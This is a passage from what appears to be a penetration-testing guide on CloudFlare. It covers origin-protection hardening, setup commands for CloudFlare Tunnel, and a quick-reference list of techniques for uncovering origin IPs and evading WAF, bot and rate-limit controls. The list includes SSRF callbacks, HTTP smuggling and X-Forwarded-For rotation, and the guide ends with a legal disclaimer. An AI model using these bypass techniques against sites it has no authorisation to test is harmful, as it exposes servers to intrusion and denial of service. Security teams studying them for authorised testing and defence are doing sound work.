      - Use separate IP for mail server
      - Don't use origin IP in SPF records
      - Change origin IP after initial CloudFlare setup
      
    SSL/TLS:
      - Use CloudFlare Origin CA (not public CA)
      - Enable Full (Strict) SSL mode
      - Don't expose origin cert in CT logs
      
    Application:
      - Don't make outbound connections from web server
      - Use separate service for webhooks/URL fetching
      - Don't reveal IP in error messages or debug info
      - Remove server version headers
      
    Monitoring:
      - Alert on direct-to-origin connections
      - Monitor for non-CF source IPs in web logs
      - Review DNS records regularly for accidental exposure
      
    Best Practice:
      - Use CloudFlare Tunnel (Zero Trust) — eliminates origin IP exposure entirely
      - No public IP, no firewall rules needed
      - Connection is outbound-only from origin to CloudFlare
  ```
  :::
::

### CloudFlare Tunnel (Best Protection)

::note
**CloudFlare Tunnel** (formerly Argo Tunnel) is the **most secure** option — your origin server has **no public IP address** at all. The connection is initiated outbound from your server to CloudFlare, making origin discovery impossible.
::

```bash [CloudFlare Tunnel Setup]
# ============================================
# INSTALL cloudflared
# ============================================

# Debian/Ubuntu
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -o cloudflared.deb
sudo dpkg -i cloudflared.deb

# Authenticate
cloudflared tunnel login

# Create tunnel
cloudflared tunnel create my-tunnel

# Configure tunnel
cat > ~/.cloudflared/config.yml << EOF
tunnel: YOUR_TUNNEL_ID
credentials-file: /root/.cloudflared/YOUR_TUNNEL_ID.json

ingress:
  - hostname: target.com
    service: http://localhost:80
  - hostname: api.target.com
    service: http://localhost:8080
  - service: http_status:404
EOF

# Route DNS through tunnel
cloudflared tunnel route dns my-tunnel target.com

# Start tunnel
cloudflared tunnel run my-tunnel

# Install as service
sudo cloudflared service install

# ============================================
# RESULT:
# - No public IP needed on origin
# - No firewall rules needed
# - No port forwarding
# - Origin IP cannot be discovered
# - Encrypted tunnel between origin and CloudFlare
# ============================================
```

---

## Quick Reference — Bypass Method Summary

::field-group
  ::field{name="DNS History" type="string"}
  SecurityTrails, ViewDNS, CrimeFlare — check historical A records before CloudFlare was configured.
  ::

  ::field{name="Subdomain Enum" type="string"}
  Find non-proxied subdomains (mail, ftp, dev, staging) that resolve to origin IP.
  ::

  ::field{name="Email Headers" type="string"}
  Trigger password reset or registration email — check `Received:` and `X-Originating-IP:` headers.
  ::

  ::field{name="MX/SPF Records" type="string"}
  MX records and SPF TXT records often contain or point to the origin IP.
  ::

  ::field{name="SSL/CT Logs" type="string"}
  Search crt.sh and Censys for certificates — match fingerprints to non-CF IPs.
  ::

  ::field{name="Shodan/Censys" type="string"}
  Search by favicon hash, HTTP title, or body content — filter out CloudFlare IPs.
  ::

  ::field{name="Outbound Hooks" type="string"}
  Trigger the server to connect to you (webhooks, SSRF, image fetch) — log incoming IP.
  ::

  ::field{name="WAF Bypass" type="string"}
  Encoding, case manipulation, comment insertion, whitespace alternatives, HTTP smuggling.
  ::

  ::field{name="Bot Bypass" type="string"}
  undetected-chromedriver, cloudscraper, FlareSolverr, cookie reuse from browser sessions.
  ::

  ::field{name="Rate Limit Bypass" type="string"}
  Header rotation (X-Forwarded-For), path variation, method override, content-type changes.
  ::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks — Uncovering CloudFlare
  icon: i-simple-icons-gitbook
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/uncovering-cloudflare.html
  target: _blank
  ---
  Comprehensive CloudFlare origin discovery and WAF bypass techniques.
  ::

  ::card
  ---
  title: CloudFlare Security Docs
  icon: i-simple-icons-cloudflare
  to: https://developers.cloudflare.com/fundamentals/security/
  target: _blank
  ---
  Official CloudFlare security configuration documentation for defenders.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — WAF Bypass
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass
  target: _blank
  ---
  Community-curated WAF bypass payload repository including CloudFlare-specific bypasses.
  ::

  ::card
  ---
  title: CloudFlair Tool
  icon: i-simple-icons-github
  to: https://github.com/christophetd/CloudFlair
  target: _blank
  ---
  Automated tool to find origin servers behind CloudFlare using Censys data.
  ::

  ::card
  ---
  title: CrimeFlare Database
  icon: i-lucide-database
  to: http://www.crimeflare.org:82/cfs.html
  target: _blank
  ---
  Database of known CloudFlare-protected domains and their real origin IPs.
  ::

  ::card
  ---
  title: CloudFlare Tunnel Docs
  icon: i-simple-icons-cloudflare
  to: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/
  target: _blank
  ---
  Official documentation for CloudFlare Tunnel — the recommended origin protection method.
  ::
::

::warning
**Legal & Ethical Disclaimer:** All techniques documented here are for **authorized penetration testing, bug bounty programs, and educational purposes only**. Bypassing CloudFlare protections on systems you do not own or have explicit written authorization to test is **illegal** and may violate computer fraud laws (CFAA, Computer Misuse Act, etc.). Always obtain proper authorization before testing. CloudFlare bypass during authorized assessments helps organizations understand their **true security posture** beyond the WAF layer.
::